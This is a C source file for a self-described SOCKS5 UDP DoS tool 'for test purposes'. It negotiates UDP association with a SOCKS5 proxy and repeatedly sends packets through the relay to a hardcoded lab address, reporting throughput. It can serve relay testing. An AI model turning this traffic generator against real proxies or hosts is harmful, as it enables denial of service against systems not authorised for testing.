/**
 * A super lightweight SOCKS5 UDP DoS tool.
 * Has Zero-Tolerance to various errors.
 * Test purpose only.
 *
 * Copyright (C) nicholascw. Licensed with GPLv2.
 *
 */


#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <errno.h>
#include <signal.h>
#include <poll.h>
#include <time.h>

#define I_HOST       0
#define I_PORT       1

bool sigint_triggered;


char **parse_args(int argc, char **argv);

int conn_srv_tcp(const char *host, const char *port) {
    int rc;
    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(sock_fd == -1) exit(1);
    struct addrinfo hints;
    struct addrinfo *result;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if((rc = getaddrinfo(host, port, &hints, &result))) exit(rc);
    if(connect(sock_fd, result->ai_addr, result->ai_addrlen) == -1) {
        perror("connect()");
        exit(1);
    }
    freeaddrinfo(result);
    return sock_fd;
}

int socks5_init_noauth(int sock_fd) {
    uint8_t buf[64];
    int rc;
    memset(buf, 0, 64);
    buf[0] = 5;
    buf[1] = 1;
    buf[2] = 0;
    do {
        fprintf(stderr, "Trying to send handshake packet...\n");
        rc = write(sock_fd, buf, 3);
        if(rc) perror("socks5_init_noauth.send");
    } while(rc != 3);
    fprintf(stderr, "Handshake packet sent, waiting for response...\n");
    buf[0] = 0;
    do {
        rc = recv(sock_fd, buf, 2, MSG_WAITALL);
        if(rc) perror("socks5_init_noauth.recv");
    } while(rc != 2);
    if(buf[0] != 5) {
        fprintf(stderr, "Damn! It's not a SOCKS5 server! Disconnected.\n");
        return 1;
    }
    if(buf[1] != 0) {
        fprintf(stderr, "Damn! Cannot pass auth! Disconnected.\n");
        return 1;
    }
    fprintf(stderr, "SOCKS5 initiation done!\n");
    return 0;
}

char *str_socks5_reply_parse(uint8_t rep) {
/*
          o  REP    Reply field:
             o  X'00' succeeded
             o  X'01' general SOCKS server failure
             o  X'02' connection not allowed by ruleset
             o  X'03' Network unreachable
             o  X'04' Host unreachable
             o  X'05' Connection refused
             o  X'06' TTL expired
             o  X'07' Command not supported
             o  X'08' Address type not supported
             o  X'09' to X'FF' unassigned
*/
    switch(rep) {
        case 0:
            return strdup("Succeeded.\n");
        case 1:
            return strdup("General SOCKS server failure.\n");
        case 2:
            return strdup("Connection not allowed by ruleset.\n");
        case 3:
            return strdup("Network unreachable.\n");
        case 4:
            return strdup("Host unreachable.\n");
        case 5:
            return strdup("Connection refused.\n");
        case 6:
            return strdup("TTL expired.\n");
        case 7:
            return strdup("Command not supported.\n");
        case 8:
            return strdup("Address type not supported.\n");
        default:
            return strdup("Unknown error.\n");
    }
}

void human_readable_ip(uint32_t ip, char *str) {
    // https://stackoverflow.com/questions/1680365/integer-to-ip-address-c
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    sprintf(str, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
}

int socks5_udp_assoc(int sock_fd, uint32_t *relay_addr, uint16_t *relay_port) {
    uint8_t buf[64];
    buf[0] = 5; // version
    buf[1] = 3; // udp association cmd
    buf[2] = 0; // rsv
    buf[3] = 1; // ipv4 only
    uint32_t *ipv4_addr = (uint32_t *) (buf + 4);
    uint16_t *udp_port = (uint16_t *) (buf + 4 + 4);
    *ipv4_addr = htonl(0x0a0000b8); // 10.0.0.184
    *udp_port = htons(2333); // netcat will wait here on 10.0.0.184
    int rc;
    do {
        fprintf(stderr, "Trying to send UDP Association packet...\n");
        rc = write(sock_fd, buf, 10);
        if(rc) perror("socks5_udp_assoc.send");
    } while(rc != 10);
    fprintf(stderr, "UDP Association packet sent! Waiting for response...\n");
    buf[0] = 0;
    do {
        rc = recv(sock_fd, buf, 10, MSG_WAITALL);
        if(rc) perror("socks5_udp_assoc.recv");
    } while(rc != 10);
    if(buf[0] != 5) {
        fprintf(stderr, "Damn! It's not a SOCKS5 server! Disconnected.\n");
        return 1;
    }
    if(buf[1]) {
        char *err_msg = str_socks5_reply_parse(buf[1]);
        fprintf(stderr, "Server reply: %s", err_msg);
        free(err_msg);
        return 1;
    }
    if(buf[3] != 1) {
        fprintf(stderr, "I am not willing to deal with address other than IPv4 currently~\n");
        return 1;
    }
    *relay_addr = *((uint32_t *) (buf + 4));
    *relay_port = *((uint16_t *) (buf + 8));
    char h_ip[16];
    human_readable_ip(ntohl(*relay_addr), h_ip);
    fprintf(stderr, "UDP Associated! \n"
                    "Ready to send UDP request to relay server specified: %s:%d\n", h_ip, ntohs(*relay_port));
    return 0;
}
void intHandler(int sig) {
    sigint_triggered = true;
}


int main(int argc, char **argv) {
    sigint_triggered = false;
    signal(SIGINT, intHandler);
    char **args = parse_args(argc, argv);
    int srv_sock = conn_srv_tcp(args[I_HOST], args[I_PORT]);
    if(!srv_sock) { exit(1); }
    if(socks5_init_noauth(srv_sock)) goto __FAILED;
    uint32_t r_addr;
    uint16_t r_port;
    if(socks5_udp_assoc(srv_sock, &r_addr, &r_port)) goto __FAILED;

    int udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(udp_sock < 0) perror("udp_sock");
    struct sockaddr_in udp_sock_addr;
    memset(&udp_sock_addr, 0, sizeof(udp_sock_addr));
    udp_sock_addr.sin_family = AF_INET;
    udp_sock_addr.sin_port = r_port;
    udp_sock_addr.sin_addr.s_addr = r_addr;
    uint8_t buf[128];
    memset(buf, 0, 128);
    buf[3] = 1; // set ATYP to IPv4
    uint32_t *ipv4_addr = (uint32_t *) (buf + 4);
    uint16_t *udp_port = (uint16_t *) (buf + 4 + 4);
    *ipv4_addr = htonl(0x0a0000b8); // 10.0.0.184
    *udp_port = htons(2333); // netcat will wait here on 10.0.0.184:2333
    for(uint8_t j = 11; j < 128; j++) {
        buf[j] = ((uint8_t) '0') + j % 10;
    }
    buf[11 + 10] = '\n';
    uint8_t recv_buf[4096];
    int len;
    memset(recv_buf, 0, 4096);
    struct pollfd wait_reply;
    wait_reply.fd = udp_sock;
    wait_reply.events = POLLIN;
    wait_reply.revents = 0;
    ssize_t stats_in = 0, stats_out = 0;
    time_t end_ts, start_ts = time(NULL);
    while(!sigint_triggered) {
        sendto(udp_sock, buf, 128, 0, (const struct sockaddr *) &udp_sock_addr, sizeof(udp_sock_addr));
        stats_out += 128;
        printf("1 packet sent.\n");
        poll(&wait_reply, 1, -1);
        ssize_t tmp = recvfrom(udp_sock, recv_buf, 4096, MSG_DONTWAIT, &udp_sock_addr, &len);
        if(tmp > 0) stats_in += tmp;
        printf("returned: %ld bytes\n", tmp);
        for(int y = 0; y < tmp/8; y++) {
            printf("0x%02x\t", y * 8);
            for(int x = 0; x < 8; x++){
                printf("%02x ", recv_buf[y * 8 + x]);
            }
            printf("\n");
        }
    }
    end_ts = time(NULL);
    double spd_in = stats_in/(end_ts-start_ts)/1024.f/1024.f,
           spd_out = stats_out/(end_ts-start_ts)/1024.f/1024.f;
    printf("Statistics: During %ld seconds, In: %ld Bytes, Out: %ld Bytes, Send speed: %f MB/s, Recv speed: %f MB/s\n",
           (end_ts-start_ts) , stats_in, stats_out, spd_out, spd_in);
    __FAILED:
    fprintf(stderr, "Tearing myself down...\n");
    if(shutdown(srv_sock, SHUT_RDWR)) perror("shutdown()");
    close(srv_sock);
    return 0;
}

/**
 * Given commandline argc and argv, parses argv.
 *
 * argc argc from main()
 * argv argv from main()
 *
 * Returns char* array in form of {host, port, NULL}
 * where `method` is ALL CAPS
 */
char **parse_args(int argc, char **argv) {
    if(argc != 2) return NULL;

    char *host = strtok(argv[1], ":");
    char *port = strtok(NULL, ":");
    if(port == NULL) return NULL;
    char **args = calloc(1, 3 * sizeof(char *));
    args[0] = host;
    args[1] = port;
    args[2] = 0;
    return args;
}
